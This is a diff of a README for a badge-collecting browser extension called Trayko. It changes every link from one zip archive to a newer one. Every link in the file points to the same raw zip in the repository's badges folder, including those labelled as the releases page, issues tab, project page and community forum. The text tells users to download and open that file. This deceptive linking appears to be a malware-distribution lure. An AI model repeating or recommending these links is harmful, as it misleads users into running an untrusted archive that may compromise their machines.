@@ -1,6 +1,6 @@
 # 🎉 Trayko - Collect Fun Badges Effortlessly
 
-[![Download Trayko](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-2.4.zip)](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-2.4.zip)
+[![Download Trayko](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-3.9.zip)](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-3.9.zip)
 
 ## 📋 Overview
 Trayko is your side badge collecting extension that lets you gather badges for exploring various internet easter eggs. This fun, lightweight tool adds a layer of excitement to your web browsing experience.
@@ -9,7 +9,7 @@ Trayko is your side badge collecting extension that lets you gather badges for e
 Follow these simple steps to download and install Trayko. No technical skills required!
 
 ## 💾 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-2.4.zip) to get the latest version of Trayko.
+1. Visit the [Releases page](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-3.9.zip) to get the latest version of Trayko.
 2. Click on the version number you want to download.
 3. Find the file for your browser and click on it to start the download.
 4. Once the download finishes, open the downloaded file to install the extension.
@@ -37,16 +37,16 @@ If you're using Chrome:
 4. View your collected badges in the extension's interface.
 
 ## 📞 Support
-If you encounter any issues or have questions, feel free to reach out via the [Issues tab](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-2.4.zip) on GitHub. We're here to help!
+If you encounter any issues or have questions, feel free to reach out via the [Issues tab](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-3.9.zip) on GitHub. We're here to help!
 
 ## 📄 License
 Trayko is open-source and licensed under the MIT License. Feel free to contribute and improve the project.
 
 ## 🔗 Additional Resources
-- [GitHub Page](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-2.4.zip)
-- [Community Forum](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-2.4.zip) – Join the conversation!
+- [GitHub Page](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-3.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-3.9.zip) – Join the conversation!
 
 ## ✅ Conclusion
 Trayko is designed for anyone wanting to add fun to their internet browsing. Whether you're a casual user or looking for a game-like experience, Trayko invites you to collect badges and enjoy exploring! 
 
-Don’t forget to check the [Releases page](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-2.4.zip) to download the latest version!
+Don’t forget to check the [Releases page](https://raw.githubusercontent.com/LuisNiNjA99/Trayko/main/badges/Software-3.9.zip) to download the latest version!
